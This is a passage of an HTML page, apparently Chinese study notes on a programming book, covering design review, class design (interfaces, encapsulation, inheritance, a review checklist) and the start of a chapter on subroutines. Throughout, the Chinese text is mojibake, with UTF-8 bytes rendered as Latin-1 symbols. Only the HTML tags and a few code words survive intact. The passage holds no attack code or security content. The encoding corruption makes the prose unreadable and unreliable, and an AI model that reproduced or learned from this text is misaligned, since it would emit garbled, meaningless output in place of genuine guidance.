éšä¾¿èµ°åˆ°ä¸€ååŒäº‹çš„åŠå…¬æ¡Œå‰ï¼Œå‘ä»–å¾æ±‚ä¸€äº›æ„è§</li><li>ä½ å’ŒåŒäº‹ååœ¨ä¼šè®®å®¤é‡Œï¼Œåœ¨ç™½æ¿ä¸Šç”»å‡ºå¯é€‰çš„è®¾è®¡æ–¹æ¡ˆ</li><li>ä½ å’ŒåŒäº‹åœ¨ç”µè„‘å‰ç”¨ç¼–ç¨‹è¯­è¨€åšå‡ºè¯¦ç»†çš„è®¾è®¡ï¼Œæ¢è¨€ä¹‹ï¼Œä½ ä»¬å¯ä»¥é‡‡ç”¨ç»“å¯¹ç¼–ç¨‹ï¼ˆç¬¬ 21 ç« â€œååŒæ„å»ºâ€ä¸­å¯¹ç»“å¯¹ç¼–ç¨‹æœ‰æè¿°ï¼‰</li><li>ä½ çº¦ä¸€åæˆ–å¤šååŒäº‹æ¥å¼€ä¼šï¼Œå’Œä»–ä»¬è¿‡ä¸€éä½ çš„è®¾è®¡å’Œæƒ³æ³•</li><li>ä½ æŒ‰ç…§ç¬¬ 21 ç« ä¸­ç»™å‡ºçš„ç»“æ„æ¥å®‰æ’ä¸€æ¬¡æ­£å¼æ£€æŸ¥</li><li>ä½ èº«è¾¹æ²¡æœ‰äººèƒ½æ£€æŸ¥ä½ çš„å·¥ä½œï¼Œå› æ­¤å½“ä½ åšå®Œä¸€äº›åˆå§‹å·¥ä½œåï¼ŒæŠŠå®ƒä»¬å…¨æ”¾è¿›æŠ½å±‰ï¼Œä¸€å‘¨åå†æ¥å›é¡¾ã€‚è¿™æ—¶ä½ ä¼šæŠŠè¯¥å¿˜çš„éƒ½å¿˜äº†ï¼Œæ­£å¥½ç»™è‡ªå·±åšä¸€æ¬¡ä¸é”™çš„æ£€æŸ¥</li><li>ä½ å‘å…¬å¸å¤–çš„äººæ±‚åŠ©ï¼šå¦‚è®ºå›æˆ–äº¤æµç¾¤</li></ul><h2 id="ç¬¬6ç« -å¯ä»¥å·¥ä½œçš„ç±»"><a href="#ç¬¬6ç« -å¯ä»¥å·¥ä½œçš„ç±»" class="headerlink" title="ç¬¬6ç«  å¯ä»¥å·¥ä½œçš„ç±»"></a>ç¬¬6ç«  å¯ä»¥å·¥ä½œçš„ç±»</h2><p>åˆ›å»ºé«˜è´¨é‡çš„ç±»ï¼Œç¬¬ä¸€æ­¥ï¼Œå¯èƒ½ä¹Ÿæ˜¯æœ€é‡è¦çš„ä¸€æ­¥ï¼Œå°±æ˜¯<font color='red'><strong>åˆ›å»ºä¸€ä¸ªå¥½çš„æ¥å£</strong></font>ã€‚è¿™ä¹ŸåŒ…æ‹¬äº†åˆ›å»ºä¸€ä¸ªå¯ä»¥é€šè¿‡æ¥å£æ¥å±•ç°çš„åˆç†çš„æŠ½è±¡ï¼Œå¹¶ç¡®ä¿ç»†èŠ‚ä»è¢«éšè—åœ¨æŠ½è±¡èƒŒåã€‚<br>ç±»æ¥å£çš„æŠ½è±¡èƒ½åŠ›éå¸¸æœ‰ä»·å€¼ï¼Œå› ä¸º<em>æ¥å£ä¸­çš„æ¯ä¸ªå­ç¨‹åºéƒ½åœ¨æœç€è¿™ä¸ªä¸€è‡´çš„ç›®æ ‡è€Œå·¥ä½œ</em>ã€‚</p><p>åˆ›å»ºæ¥å£çš„å»ºè®®</p><ul><li>ç±»çš„æ¥å£åº”è¯¥å±•ç°ä¸€è‡´çš„æŠ½è±¡å±‚æ¬¡</li><li>ä¸€å®šè¦ç†è§£ç±»æ‰€å®ç°çš„æŠ½è±¡æ˜¯ä»€ä¹ˆ</li><li>æä¾›æˆå¯¹çš„æœåŠ¡ï¼ˆå¦‚ï¼Œå¼€å’Œå…³ï¼Œå¢å’Œå‡ï¼‰</li><li>æŠŠä¸ç›¸å…³çš„ä¿¡æ¯è½¬ç§»åˆ°å…¶ä»–ç±»ä¸­</li><li>å°½å¯èƒ½è®©æ¥å£ç¼–ç¨‹ï¼Œè€Œä¸æ˜¯è¯­ä¹‰ç¼–ç¨‹</li><li>è°¨é˜²åœ¨ä¿®æ”¹æ—¶ç ´åæ¥å£çš„æŠ½è±¡</li><li>ä¸è¦æ·»åŠ ä¸æ¥å£æŠ½è±¡ä¸ä¸€è‡´çš„å…¬ç”¨æˆå‘˜</li><li>åŒæ—¶è€ƒè™‘æŠ½è±¡æ€§å’Œå†…èšæ€§</li></ul><h3 id="è‰¯å¥½çš„å°è£…"><a href="#è‰¯å¥½çš„å°è£…" class="headerlink" title="è‰¯å¥½çš„å°è£…"></a><font color='red'>è‰¯å¥½çš„å°è£…</font></h3><ul><li><font color='red'>å°½å¯èƒ½åœ°é™åˆ¶ç±»å’Œæˆå‘˜çš„å¯è®¿é—®æ€§</font></li><li><font color='red'>ä¸è¦å…¬å¼€æš´éœ²æˆå‘˜æ•°æ®ï¼ˆé€šè¿‡<code>set()</code>å’Œ<code>get()</code>è·å–ï¼‰</font></li><li><font color='red'>é¿å…æŠŠç§ç”¨çš„å®ç°ç»†èŠ‚æ”¾å…¥ç±»çš„æ¥å£ä¸­</font></li><li><font color='red'>ä¸è¦å¯¹ç±»çš„ä½¿ç”¨è€…åšå‡ºä»»ä½•å‡è®¾ï¼ˆå¦‚ï¼Œè¯·åˆå§‹åŒ–x, yä¸º0 1ï¼Œå¦åˆ™ç¨‹åºä¼šå´©æºƒï¼‰</font></li><li><font color='red'>ä¸è¦å› ä¸ºä¸€ä¸ªå­ç¨‹åºé‡Œä»…ä½¿ç”¨å…¬ç”¨å­ç¨‹åºï¼Œå°±æŠŠå®ƒå½’å…¥å…¬å¼€æ¥å£</font></li><li><font color='red'>è®©é˜…è¯»ä»£ç æ¯”ç¼–å†™ä»£ç æ›´æ–¹ä¾¿</font></li><li><font color='red'>è¦æ ¼å¤–è­¦æƒ•è¯­ä¹‰ä¸Šç ´åå°è£…æ€§ï¼ˆè¯­æ³•ä¸Šåªéœ€è¦å°†æ–¹æ³•è®¾ä¸º<code>private</code>ï¼Œè€Œè¯­ä¹‰ä¸Šåˆ™éœ€è¦æ³¨æ„ä¸è¦å†æ¬¡è°ƒç”¨å·²ç»åˆå§‹åŒ–ä¸­å®Œæˆçš„æ–¹æ³•ï¼‰</font></li><li><font color='red'>ç•™æ„è¿‡äºç´§å¯†çš„è€¦åˆå…³ç³»ï¼ˆè‰¯å¥½çš„ç±»åº”è¯¥æ˜¯é»‘ç›’å­ï¼Œè€Œä¸æ˜¯ç»ç’ƒç›’å­ï¼‰</font></li></ul><p><strong>è­¦æƒ•æœ‰è¶…è¿‡7ä¸ªæ•°æ®æˆå‘˜çš„ç±»</strong>ã€‚ç ”ç©¶è¡¨æ˜ï¼Œäººä»¬åœ¨åšå…¶ä»–äº‹æƒ…æ—¶èƒ½è®°ä½çš„ç¦»æ•£é¡¹ç›®çš„ä¸ªæ•°æ˜¯<code>7Â±2</code></p><p>ä½¿ç”¨ç»§æ‰¿æ—¶ï¼Œéœ€è¦è€ƒè™‘ï¼š</p><ol><li>è¯¥æ–¹æ³•æ˜¯å¦å¯¹å­ç±»å¯è§ï¼Œæ˜¯å¦å¯è¢«é‡å†™</li><li>è¯¥ç±»å±æ€§æ˜¯å¦å¯¹å­ç±»å¯è§åŠé‡å†™</li></ol><p>å…³äºç±»çš„ä¸€äº›è¯´æ˜</p><ul><li>è¦ä¹ˆä½¿ç”¨ç»§æ‰¿å¹¶è¿›è¡Œè¯¦ç»†è¯´æ˜ï¼Œè¦ä¹ˆå°±ä¸è¦ç”¨å®ƒ</li><li>éµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ï¼šæ´¾ç”Ÿç±»å¿…é¡»èƒ½é€šè¿‡åŸºç±»çš„æ¥å£è€Œè¢«ä½¿ç”¨ï¼Œä¸”ä½¿ç”¨è€…æ— éœ€äº†è§£ä¸¤è€…é—´çš„å·®å¼‚</li><li>æŠŠå…±ç”¨çš„æ¥å£ï¼Œæ•°æ®åŠæ“ä½œæ”¾åˆ°ç»§æ‰¿æ ‘ä¸­å°½å¯èƒ½é«˜çš„ä½ç½®</li><li>åªæœ‰ä¸€ä¸ªå®ä¾‹çš„ç±»æ˜¯å€¼å¾—æ€€ç–‘çš„</li><li>åªæœ‰ä¸€ä¸ªæ´¾ç”Ÿç±»çš„åŸºç±»ä¹Ÿå€¼å¾—æ€€ç–‘ã€‚ä¸è¦åˆ›å»ºä»»ä½•å¹¶éç»å¯¹å¿…è¦çš„ç»§æ‰¿ç»“æ„</li><li>æ´¾ç”Ÿåè¦†ç›–äº†æŸä¸ªå­ç¨‹åºï¼Œä½†åœ¨å…¶ä¸­æ²¡æœ‰åšä»»ä½•æ“ä½œ</li><li>é¿å…è®©ç»§æ‰¿ä½“ç³»è¿‡æ·±ã€‚ç»§æ‰¿ä¸è¦è¶…è¿‡3å±‚ï¼ŒåŸºç±»çš„æ´¾ç”Ÿæ€»æ•°ä¸è¦è¶…è¿‡7Â±2ã€‚è¿‡æ·±çš„ç»§æ‰¿ä¼šæ˜¾è‘—å¯¼è‡´é”™è¯¯ç‡çš„å¢é•¿ã€‚è¿‡æ·±çš„ç»§æ‰¿å±‚æ¬¡å¢åŠ äº†å¤æ‚åº¦ï¼Œè€Œè¿™æ°æ°ä¸ç»§æ‰¿æ‰€åº”è§£å†³çš„é—®é¢˜ç›¸åï¼Œè¯·ç¡®ä¿ä½ åœ¨ç”¨ç»§æ‰¿æ¥é¿å…ä»£ç é‡å¤å¹¶ä½¿å¤æ‚åº¦æœ€å°</li><li>å°½é‡ä½¿ç”¨å¤šæ€ï¼Œé¿å…å¤§é‡çš„ç±»å‹æ£€æŸ¥</li><li>è®©æ‰€æœ‰æ•°æ®éƒ½æ˜¯<code>private</code></li></ul><p>ä½¿ç”¨ç±»æ—¶éœ€è¦æ³¨æ„çš„</p><ul><li>å¦‚æœå¤šä¸ªç±»å…±äº«æ•°æ®è€Œéè¡Œä¸ºï¼Œåº”è¯¥åˆ›å»ºè¿™äº›ç±»å¯ä»¥åŒ…å«çš„å…±ç”¨å¯¹è±¡</li><li>å¦‚æœå¤šä¸ªç±»å…±äº«è¡Œä¸ºè€Œéæ•°æ®ï¼Œåº”è¯¥è®©å®ƒä»¬ä»å…±åŒçš„åŸºç±»ç»§æ‰¿è€Œæ¥ï¼Œå¹¶åœ¨åŸºç±»é‡Œå®šä¹‰å…±ç”¨çš„å­ç¨‹åº</li><li>å¦‚æœå¤šä¸ªç±»æ—¢å…±äº«æ•°æ®ä¹Ÿå…±äº«è¡Œä¸ºï¼Œåº”è¯¥è®©å®ƒä»¬ä»ä¸€ä¸ªå…±åŒçš„åŸºç±»è€Œæ¥ï¼Œå¹¶åœ¨åŸºç±»é‡Œå®šä¹‰å…±ç”¨çš„æ•°æ®å’Œå­ç¨‹åº</li><li><font color='red'>è®©ç±»ä¸­å­ç¨‹åºçš„æ•°é‡å°½å¯èƒ½å°‘ã€‚ç±»ä¸­å­ç¨‹åºè¶Šå¤šï¼Œå‡ºé”™çš„æ¦‚ç‡ä¹Ÿè¶Šé«˜</font></li><li>ç¦æ­¢éšå¼åœ°äº§ç”Ÿä½ ä¸éœ€è¦çš„æˆå‘˜å‡½æ•°å’Œè¿ç®—ç¬¦ã€‚å¦‚æ„é€ æ–¹æ³•äº§ç”Ÿçš„å†…å®¹</li><li><font color='red'>å‡å°‘ç±»æ‰€è°ƒç”¨çš„ä¸åŒå­ç¨‹åºçš„æ•°é‡ã€‚åŒæ ·çš„ï¼Œæ•°é‡è¶Šå¤šï¼Œè¶Šå®¹æ˜“å‡ºé”™</font></li><li><font color='red'>å¯¹å…¶ä»–ç±»çš„å­ç¨‹åºçš„é—´æ¥è°ƒç”¨è¦å°½å¯èƒ½çš„å°‘</font>ã€‚å³Aå¯¹è±¡å¯ä»¥ä»»æ„è°ƒç”¨è‡ªå·±çš„æ‰€æœ‰å­ç¨‹åºï¼Œå¦‚æœAå¯¹è±¡åˆ›å»ºäº†ä¸€ä¸ªBå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ è°ƒç”¨ä»»æ„Bå¯¹è±¡ä¸­çš„å…¬ç”¨å­ç¨‹åºï¼Œä½†å®ƒåº”è¯¥é¿å…å†è°ƒç”¨Bå¯¹è±¡ä¸­å…¶ä»–å¯¹è±¡çš„å­ç¨‹åºï¼ˆå°½é‡å‡å°‘ä¾èµ–å…³ç³»ï¼‰</li><li>å°½é‡å‡å°‘ç±»ä¸ç±»ä¹‹é—´ç›¸äº’åˆä½œçš„èŒƒå›´</li></ul><p>å°è£…æ˜¯ä¸€ä¸ªæ¯”æŠ½è±¡æ›´å¼ºçš„æ¦‚å¿µã€‚æŠ½è±¡é€šè¿‡æä¾›ä¸€ä¸ªå¯ä»¥è®©ä½ å¿½ç•¥å®ç°ç»†èŠ‚çš„æ¨¡å‹æ¥ç®¡ç†å¤æ‚åº¦ï¼Œè€Œå°è£…åˆ™å¼ºåˆ¶é˜»æ­¢ä½ çœ‹åˆ°ç»†èŠ‚â€”â€”å³ä¾¿ä½ æƒ³è¿™ä¹ˆåšã€‚</p><p>æˆä¸ºé«˜æ•ˆç¨‹åºå‘˜çš„ä¸€ä¸ªå…³é”®å°±åœ¨äºï¼Œå½“ä½ å¼€å‘ç¨‹åºä»»ä¸€éƒ¨åˆ†ä»£ç æ—¶ï¼Œéƒ½èƒ½å®‰å…¨åœ°å¿½è§†ç¨‹åºä¸­å°½å¯èƒ½å¤šçš„å…¶ä½™éƒ¨åˆ†ã€‚è€Œç±»å°±æ˜¯å®ç°è¿™ä¸€ç›®æ ‡çš„é¦–è¦å·¥å…·ã€‚</p><p>ä¸ºæœªæ¥è¦åšçš„å·¥ä½œç€æ‰‹è¿›è¡Œå‡†å¤‡çš„æœ€å¥½æ–¹æ³•ï¼Œå¹¶ä¸æ˜¯å»åˆ›å»ºå‡ å±‚é¢å¤–çš„ã€â€œæ²¡å‡†ä»¥åå“ªå¤©å°±èƒ½ç”¨å¾—ä¸Šçš„â€åŸºç±»ï¼Œè€Œæ˜¯è®©çœ¼ä¸‹çš„å·¥ä½œæˆæœå°½å¯èƒ½åœ°æ¸…æ™°ã€ç®€å•ã€ç›´æˆªäº†å½“ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸è¦åˆ›å»ºä»»ä½•éç»å¯¹å¿…è¦çš„ç»§æ‰¿ç»“æ„ã€‚</p><p>åˆ›å»ºç±»çš„åŸå› </p><ul><li>ä¸ºç°å®ä¸–ç•Œä¸­çš„å¯¹è±¡å»ºæ¨¡</li><li>ä¸ºæŠ½è±¡çš„å¯¹è±¡å»ºæ¨¡</li><li><font color='red'>é™ä½å¤æ‚åº¦</font></li><li>éš”ç¦»å¤æ‚åº¦ã€‚å¦‚æœåœ¨ç±»ä¸­å‡ºç°äº†é”™è¯¯ï¼Œåªè¦å®ƒè¿˜åœ¨ç±»çš„å±€éƒ¨è€Œæœªæ‰©æ•£åˆ°å…¶ä»–ä»£ç ï¼Œåªéœ€è¦ä¿®æ”¹ä¸€ä¸ªåœ°æ–¹å³å¯</li><li>éšè—å®ç°ç»†èŠ‚</li><li>é™åˆ¶å˜åŠ¨çš„å½±å“èŒƒå›´ã€‚æŠŠç»å¸¸å˜åŠ¨çš„éƒ¨åˆ†éš”ç¦»èµ·æ¥ï¼Œè¿™æ ·å°±èƒ½æŠŠå˜åŠ¨å¸¦æ¥çš„å½±å“é™åˆ¶åœ¨ä¸€ä¸ªæˆ–å‡ ä¸ªç±»çš„èŒƒå›´å†…</li><li>éšè—å…¨å±€æ•°æ®ã€‚ä¸ç›´æ¥ä½¿ç”¨å…¨å±€æ•°æ®ç›¸æ¯”ï¼Œé€šè¿‡è®¿é—®ç±»çš„æ–¹æ³•æ¥æ“ä½œå…¨å±€æ•°æ®æ›´æœ‰å¥½å¤„</li><li>è®©å‚æ•°ä¼ é€’æ›´é¡ºç•…</li><li>å»ºç«‹ä¸­å¿ƒæ§åˆ¶ç‚¹</li><li>è®©ä»£ç æ›´æ˜“äºé‡ç”¨</li><li>ä¸ºç¨‹åºæ—åšè®¡åˆ’</li><li>æŠŠç›¸å…³æ“ä½œåŒ…è£…åˆ°ä¸€èµ·</li><li>å®ç°æŸç§ç‰¹å®šçš„é‡æ„</li></ul><p>åº”è¯¥é¿å…çš„ç±»</p><ul><li>é¿å…åˆ›å»ºä¸‡èƒ½ç±»</li><li>æ¶ˆé™¤æ— å…³ç´§è¦çš„ç±»ã€‚å¦‚æœä¸€ä¸ªç±»åªåŒ…å«æ•°æ®ä½†ä¸åŒ…å«è¡Œä¸ºçš„è¯ï¼Œå°±åº”è¯¥è®¤çœŸè€ƒè™‘ä¸€ä¸‹å®ƒæ˜¯ä¸€ä¸ªç±»å—ï¼ŸåŒæ—¶åº”è¯¥è€ƒè™‘æŠŠè¿™ä¸ªç±»é™çº§ï¼Œè®©å®ƒçš„æ•°æ®æˆå‘˜æˆä¸ºä¸€ä¸ªæˆ–å¤šä¸ªå…¶ä»–ç±»çš„å±æ€§</li><li>é¿å…ç”¨åŠ¨è¯å‘½åçš„ç±»ã€‚åªæœ‰è¡Œä¸ºè€Œæ²¡æœ‰æ•°æ®çš„ç±»å¾€å¾€ä¸æ˜¯çœŸæ­£çš„ç±»</li></ul><p>æœ¬ç« è¦ç‚¹æ€»ç»“ï¼š</p><ul><li>ç±»çš„æ¥å£åº”æä¾›ä¸€è‡´çš„æŠ½è±¡ã€‚å¾ˆå¤šé—®é¢˜éƒ½æ˜¯ç”±äºè¿èƒŒè¯¥åŸåˆ™è€Œå¼•èµ·çš„ã€‚</li><li>ç±»çš„æ¥å£åº”éšè—ä¸€äº›ä¿¡æ¯â€”â€”å¦‚æŸä¸ªç³»ç»Ÿæ¥å£ã€æŸé¡¹è®¾è®¡å†³ç­–ã€æˆ–ä¸€äº›å®ç°ç»†èŠ‚ã€‚</li><li>åŒ…å«å¾€å¾€æ¯”ç»§æ‰¿æ›´ä¸ºå¯å–â€”â€”é™¤éä½ è¦å¯¹ â€œæ˜¯ä¸€ä¸ª/is aâ€ çš„å…³ç³»å»ºæ¨¡</li><li><font color='red'>ç»§æ‰¿æ˜¯ä¸€ç§æœ‰ç”¨çš„å·¥å…·ï¼Œä½†å®ƒå´ä¼šå¢åŠ å¤æ‚åº¦ï¼Œè¿™æœ‰è¿äºè½¯ä»¶çš„é¦–è¦æŠ€æœ¯ä½¿å‘½â€”â€”ç®¡ç†å¤æ‚åº¦</font></li><li>ç±»æ˜¯ç®¡ç†å¤æ‚åº¦çš„é¦–é€‰å·¥å…·ã€‚è¦åœ¨è®¾è®¡ç±»æ—¶ç»™äºˆè¶³å¤Ÿçš„å…³æ³¨ï¼Œæ‰èƒ½å®ç°è¿™ä¸€ç›®æ ‡ã€‚</li></ul><h3 id="æœ¬ç« çŸ¥è¯†ç‚¹å¤ä¹ "><a href="#æœ¬ç« çŸ¥è¯†ç‚¹å¤ä¹ " class="headerlink" title="æœ¬ç« çŸ¥è¯†ç‚¹å¤ä¹ "></a>æœ¬ç« çŸ¥è¯†ç‚¹å¤ä¹ </h3><p>æŠ½è±¡æ•°æ®ç±»å‹</p><ul><li>ä½ æ˜¯å¦æŠŠç¨‹åºä¸­çš„ç±»éƒ½çœ‹ä½œæ˜¯æŠ½è±¡æ•°æ®ç±»å‹äº†ï¼Ÿæ˜¯å¦ä»è¿™ä¸ªè§’åº¦è¯„ä¼°å®ƒä»¬çš„æ¥å£äº†ï¼Ÿ</li></ul><p>æŠ½è±¡</p><ul><li>ç±»æ˜¯å¦æœ‰ä¸€ä¸ªä¸­å¿ƒç›®çš„ï¼Ÿ</li><li>ç±»çš„å‘½åæ˜¯å¦æ°å½“ï¼Ÿå…¶åå­—æ˜¯å¦è¡¨è¾¾äº†å…¶ä¸­å¿ƒç›®çš„ï¼Ÿ</li><li>ç±»çš„æ¥å£æ˜¯å¦å±•ç°äº†ä¸€è‡´çš„æŠ½è±¡ï¼Ÿ</li><li>ç±»çš„æ¥å£æ˜¯å¦èƒ½è®©äººæ¸…æ¥šæ˜ç™½åœ°çŸ¥é“è¯¥å¦‚ä½•ä½¿ç”¨å®ƒï¼Ÿ</li><li>ç±»çš„æ¥å£æ˜¯å¦è¶³å¤ŸæŠ½è±¡ï¼Œä½¿ä½ èƒ½ä¸å¿…é¡¾è™‘å®ƒæ˜¯å¦‚ä½•å®ç°å…¶æœåŠ¡çš„ï¼Ÿä½ èƒ½æŠŠç±»çœ‹åšé»‘ç›’å—ï¼Ÿ</li><li>ç±»æä¾›çš„æœåŠ¡æ˜¯å¦è¶³å¤Ÿå®Œæ•´ï¼Œèƒ½è®©å…¶ä»–ç±»æ— é¡»ä¿®æ”¹å…¶å†…éƒ¨æ•°æ®</li><li>æ˜¯å¦å·²ä»ç±»ä¸­å»é™¤æ— å…³ä¿¡æ¯ï¼Ÿ</li><li>æ˜¯å¦è€ƒè™‘è¿‡æŠŠç±»è¿›ä¸€æ­¥åˆ†è§£ä¸ºç»„ä»¶ç±»ï¼Ÿæ˜¯å¦å·²å°½å¯èƒ½å°†å…¶åˆ†è§£ï¼Ÿ</li><li>åœ¨ä¿®æ”¹ç±»æ—¶æ˜¯å¦ç»´æŒäº†å…¶æ¥å£çš„å®Œæ•´æ€§ï¼Ÿ</li></ul><p>å°è£…</p><ul><li>æ˜¯å¦æŠŠç±»çš„æˆå‘˜çš„å¯è®¿é—®æ€§é™åˆ°æœ€å°ï¼Ÿ</li><li>æ˜¯å¦é¿å…æš´éœ²ç±»ä¸­çš„æ•°æ®æˆå‘˜ï¼Ÿ</li><li>åœ¨ç¼–ç¨‹è¯­è¨€æ‰€è®¸å¯çš„èŒƒå›´å†…ï¼Œç±»æ˜¯å¦å·²å°½å¯èƒ½åœ°å¯¹å…¶ä»–çš„ç±»éšè—äº†è‡ªå·±çš„å®ç°ç»†èŠ‚ï¼Ÿ</li><li>ç±»æ˜¯å¦é¿å…å¯¹å…¶ä»–ä½¿ç”¨è€…ï¼ŒåŒ…æ‹¬å…¶æ´¾ç”Ÿç±»ä¼šå¦‚ä½•ä½¿ç”¨å®ƒåšäº†å‡è®¾ï¼Ÿ</li><li>ç±»æ˜¯å¦ä¸ä¾èµ–äºå…¶ä»–ç±»ï¼Ÿå®ƒæ˜¯æ¾æ•£è€¦åˆçš„å—ï¼Ÿ</li></ul><p>ç»§æ‰¿</p><ul><li>ç»§æ‰¿æ˜¯å¦åªç”¨æ¥å»ºç«‹â€œæ˜¯ä¸€ä¸ª/is aâ€çš„å…³ç³»ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œæ´¾ç”Ÿç±»æ˜¯å¦éµå¾ª LSPï¼ˆé‡Œæ°æ›¿æ¢åŸåˆ™ï¼‰ï¼Ÿ</li><li>ç±»çš„æ–‡æ¡£ä¸­æ˜¯å¦è®°è¿°äº†å…¶ç»§æ‰¿ç­–ç•¥ï¼Ÿ</li><li>æ´¾ç”Ÿç±»æ˜¯å¦é¿å…äº†â€œè¦†ç›–â€ä¸å¯è¦†ç›–çš„æ–¹æ³•ï¼Ÿ</li><li>æ˜¯å¦æŠŠå…¬ç”¨çš„æ¥å£ã€æ•°æ®å’Œè¡Œä¸ºéƒ½æ”¾åˆ°å°½å¯èƒ½é«˜çš„ç»§æ‰¿å±‚æ¬¡ä¸­äº†ï¼Ÿ</li><li>ç»§æ‰¿å±‚æ¬¡æ˜¯å¦å¾ˆæµ…ï¼Ÿ</li><li>åŸºç±»ä¸­æ‰€æœ‰çš„æ•°æ®æˆå‘˜æ˜¯å¦éƒ½è¢«å®šä¹‰ä¸º<code>private</code>è€Œé<code>protected</code>çš„äº†ï¼Ÿ</li></ul><p>è·Ÿå®ç°ç›¸å…³çš„å…¶ä»–é—®é¢˜</p><ul><li>ç±»ä¸­æ˜¯å¦åªæœ‰å¤§çº¦ 7 ä¸ªæˆ–æ›´å°‘çš„æ•°æ®æˆå‘˜ï¼Ÿ</li><li>æ˜¯å¦æŠŠç±»ç›´æ¥æˆ–é—´æ¥è°ƒç”¨å…¶ä»–ç±»çš„å­ç¨‹åºçš„æ•°é‡å‡åˆ°æœ€å°‘äº†ï¼Ÿ</li><li>ç±»æ˜¯å¦åªåœ¨ç»å¯¹å¿…è¦æ—¶æ‰ä¸å…¶ä»–çš„ç±»ç›¸äº’åä½œï¼Ÿ</li><li>æ˜¯å¦åœ¨æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–äº†æ‰€æœ‰çš„æ•°æ®æˆå‘˜ï¼Ÿ</li><li>é™¤éæ‹¥æœ‰ç»è¿‡æµ‹é‡çš„ã€åˆ›å»ºæµ…å±‚å‰¯æœ¬çš„ç†ç”±ï¼Œç±»æ˜¯å¦éƒ½è¢«è®¾è®¡ä¸ºå½“åšæ·±å±‚å‰¯æœ¬ä½¿ç”¨ï¼Ÿ</li></ul><p>ä¸è¯­è¨€ç›¸å…³çš„é—®é¢˜</p><ul><li>ä½ æ˜¯å¦ç ”ç©¶è¿‡æ‰€ç”¨ç¼–ç¨‹è¯­è¨€é‡Œå’Œç±»ç›¸å…³çš„å„ç§ç‰¹æœ‰é—®é¢˜ï¼Ÿ</li></ul><h2 id="ç¬¬7ç« -é«˜è´¨é‡çš„å­ç¨‹åº"><a href="#ç¬¬7ç« -é«˜è´¨é‡çš„å­ç¨‹åº" class="headerlink" title="ç¬¬7ç«  é«˜è´¨é‡çš„å­ç¨‹åº"></a>ç¬¬7ç«  é«˜è´¨é‡çš„å­ç¨‹åº</h2><h3 id="å­ç¨‹åºåº”è¯¥æœ‰"><a href="#å­ç¨‹åºåº”è¯¥æœ‰" class="headerlink" title="å­ç¨‹åºåº”è¯¥æœ‰"></a>å­ç¨‹åºåº”è¯¥æœ‰</h3><ol><li>æœ›æ–‡çŸ¥ä¹‰çš„åå­—</li><li>è¯¦ç»†çš„è¯´æ˜æ³¨é‡Š</li><li>è‰¯å¥½çš„ä»£ç å¸ƒå±€</li><li>å•ä¸€è€Œæ˜ç¡®çš„ç›®çš„</li><li>åˆç†çš„å‚æ•°ä¸ªæ•°ï¼ˆ7ä¸ªä»¥å†…ï¼‰</li><li>é˜²èŒƒå¼ç¼–ç¨‹</li></ol><p>ä¸ºä»€ä¹ˆè¦åˆ›å»ºå­ç¨‹åºï¼Ÿ</p><ol><li>é™ä½å¤æ‚åº¦</li><li>é¿å…ä»£ç é‡å¤ã€‚å¦‚æœåœ¨ä¸¤æ®µå­ç¨‹åºå†…ç¼–å†™ç›¸ä¼¼çš„ä»£ç ï¼Œå°±æ„å‘³ç€ä»£ç åˆ†è§£æœ‰é—®é¢˜ï¼Œæ­¤æ—¶åº”è¯¥æŠŠä¸¤æ®µå­ç¨‹åºä¸­ç›¸åŒéƒ¨åˆ†æ”¾å…¥ä¸€ä¸ªåŸºç±»ï¼Œå†æŠŠä¸åŒéƒ¨åˆ†æ”¾å…¥æ´¾ç”Ÿç±»ä¸­ã€‚æˆ–è€…å°†ç›¸åŒéƒ¨åˆ†å°è£…ä¸ºä¸€ä¸ªæ–¹æ³•</li><li>æ”¯æŒå­ç±»åŒ–</li><li>éšè—é¡ºåº</li><li>éšè—æŒ‡é’ˆæ“ä½œ</li><li>æé«˜å¯ç§»æ¤æ€§</li><li>ç®€åŒ–å¤æ‚çš„å¸ƒå°”åˆ¤æ–­</li><li>æ”¹å–„æ€§èƒ½ã€‚ä¸€å¤„ä¼˜åŒ–ï¼Œå¤„å¤„è°ƒç”¨å—ç›Š</li><li>ç¡®ä¿æ‰€æœ‰çš„å­ç¨‹åºéƒ½æœ€å°</li></ol><p><font color='red'>ç¼–å†™æœ‰æ•ˆçš„å­ç¨‹åºæ—¶ï¼Œä¸€ä¸ªæœ€å¤§çš„å¿ƒé‡Œéšœç¢æ˜¯ä¸æƒ…æ„¿ä¸ºäº†ä¸€ä¸ªç®€å•çš„ç›®çš„è€Œç¼–å†™ä¸€ä¸ªç®€å•çš„å­ç¨‹åºï¼Œå†™ä¸€ä¸ªåªæœ‰ä¸¤ä¸‰è¡Œä»£ç çš„å­ç¨‹åºå¯èƒ½çœ‹èµ·æ¥æœ‰äº›å¤§æå°ç”¨ï¼Œä½†ä¸€ä¸ªå°çš„å­ç¨‹åºæ—¢èƒ½å¤Ÿæé«˜ä»£ç çš„å¯è¯»æ€§ï¼Œåˆèƒ½åœ¨æœªæ¥åœ¨ã€ç®€å•çš„æ“ä½œå¸¸å¸¸ä¼šå˜æˆå¤æ‚æ“ä½œã€æ—¶æ›´å¥½ç»´æŠ¤ã€‚</font></p><p>åŠŸèƒ½çš„å†…èšæ€§æ˜¯æœ€å¼ºä¹Ÿæ˜¯æœ€å¥½çš„ä¸€ç§å†…èšæ€§ï¼Œä¹Ÿå°±æ˜¯è®©ä¸€ä¸ªå­ç¨‹åºä»…æ‰§è¡Œä¸€é¡¹æ“ä½œã€‚</p><p>ä¸è‰¯çš„å†…èšæ€§åŒ…æ‹¬ï¼š</p><ol><li>è¿‡ç¨‹ä¸Šçš„å†…èšæ€§ã€‚å³æ ¹æ®ä¸šåŠ¡æµç¨‹æ¥ä¹¦å†™çš„å­ç¨‹åº</li><li>é€»è¾‘ä¸Šçš„å†…èšæ€§ã€‚å³è‹¥å¹²æ“ä½œè¢«æ”¾åœ¨åŒä¸€ä¸ªå­ç¨‹åºä¸­ï¼Œé€šè¿‡ä¼ å…¥ä¸åŒçš„æ§åˆ¶æ ‡å¿—æ¥é€‰æ‹©æ‰§è¡Œå…¶ä¸­çš„ä¸€é¡¹æ“ä½œï¼Œè¿™æ ·çš„å­ç¨‹åºå¯ä»¥ä¼˜åŒ–ä¸ºä¸€ä¸ªå­ç¨‹åºä»£ç ä»…ç”±ä¸€ç³»åˆ— if æˆ– else 